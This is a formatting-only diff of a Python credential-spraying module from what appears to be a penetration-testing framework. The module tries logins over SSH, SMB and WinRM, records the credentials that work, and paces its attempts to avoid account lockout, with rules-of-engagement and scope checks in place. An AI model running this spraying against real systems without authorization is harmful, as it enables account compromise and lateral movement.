@@ -4,6 +4,7 @@ Classification: ACTIVE (auto-execute with audit log).
 Processes credential list in chunks of 500 (memory safety, RULE 7).
 OPSEC: Max 3 attempts per hour per user to avoid lockout.
 """
+
 from __future__ import annotations
 
 import logging
@@ -24,7 +25,9 @@ _LOCKOUT_DELAY = 1200  # 20 minutes between batches per target (avoid lockout)
 
 
 def _require_roe(roe_id: str | None, *, action_name: str) -> str:
-    normalized = " ".join(str(roe_id or os.environ.get("FORGE_ROE_ID", "") or "").strip().split())[:160]
+    normalized = " ".join(str(roe_id or os.environ.get("FORGE_ROE_ID", "") or "").strip().split())[
+        :160
+    ]
     if not normalized:
         raise RuntimeError(f"{action_name} requires roe_id or FORGE_ROE_ID before live execution.")
     return normalized
@@ -60,7 +63,9 @@ def _assert_targets_in_scope(
         return
     db_path = _connection_db_path(eng_db_conn)
     if require_scope and db_path is None:
-        raise RuntimeError("lateral_movement_spray requires a file-backed engagement DB for scope checks.")
+        raise RuntimeError(
+            "lateral_movement_spray requires a file-backed engagement DB for scope checks."
+        )
     if db_path is None:
         return
     from forge.utils.post.boundary_check import assert_in_scope
@@ -152,7 +157,14 @@ def spray_credentials(
                     tested += 1
                     if result.get("success"):
                         hits += 1
-                        results.append({"host": host, "username": username, "protocol": protocol, "cred_id": cred_id})
+                        results.append(
+                            {
+                                "host": host,
+                                "username": username,
+                                "protocol": protocol,
+                                "cred_id": cred_id,
+                            }
+                        )
                         _record_validated(eng_db_conn, cred_id, protocol, host.get("ip", ""), email)
                         print(f"[HIT] {username}@{host.get('ip')} via {protocol}", flush=True)
                         sys.stdout.flush()
@@ -178,6 +190,7 @@ def _attempt_login(host: dict, username: str, pw_enc: Optional[str], protocol: s
     # Decrypt password
     try:
         from forge.opsec.crypto import decrypt_string
+
         password = decrypt_string(pw_enc)
     except Exception:
         return {"success": False}
@@ -196,9 +209,11 @@ def _attempt_login(host: dict, username: str, pw_enc: Optional[str], protocol: s
 
 def _try_ssh(ip: str, port: int, username: str, password: str) -> dict:
     import asyncssh
+
     try:
-        with asyncssh.connect(ip, port=port, username=username, password=password,
-                              known_hosts=None, connect_timeout=5) as conn:
+        with asyncssh.connect(
+            ip, port=port, username=username, password=password, known_hosts=None, connect_timeout=5
+        ) as conn:
             result = conn.run("whoami", timeout=5)
             return {"success": True, "output": result.stdout}
     except Exception:
@@ -209,6 +224,7 @@ def _try_smb(ip: str, username: str, password: str) -> dict:
     try:
         import smbprotocol.connection
         from smbprotocol.session import Session
+
         conn = smbprotocol.connection.Connection(uuid=None, server_name=ip, port=445)
         conn.connect()
         session = Session(conn, username=username, password=password)
@@ -221,8 +237,10 @@ def _try_smb(ip: str, username: str, password: str) -> dict:
 def _try_winrm(ip: str, port: int, username: str, password: str) -> dict:
     try:
         import winrm
-        sess = winrm.Session(f"http://{ip}:{port}/wsman",
-                             auth=(username, password), transport="ntlm")
+
+        sess = winrm.Session(
+            f"http://{ip}:{port}/wsman", auth=(username, password), transport="ntlm"
+        )
         result = sess.run_cmd("whoami")
         return {"success": result.status_code == 0, "output": result.std_out.decode()}
     except Exception:
@@ -233,7 +251,9 @@ def _default_port(protocol: str) -> Optional[int]:
     return {"ssh": 22, "smb": 445, "winrm": 5985}.get(protocol)
 
 
-def _record_validated(conn: sqlite3.Connection, cred_id: int, protocol: str, host: str, email: str) -> None:
+def _record_validated(
+    conn: sqlite3.Connection, cred_id: int, protocol: str, host: str, email: str
+) -> None:
     conn.execute(
         """UPDATE credentials SET validated=1, validated_service=?, validated_host=?,
            validated_at=datetime('now') WHERE id=?""",
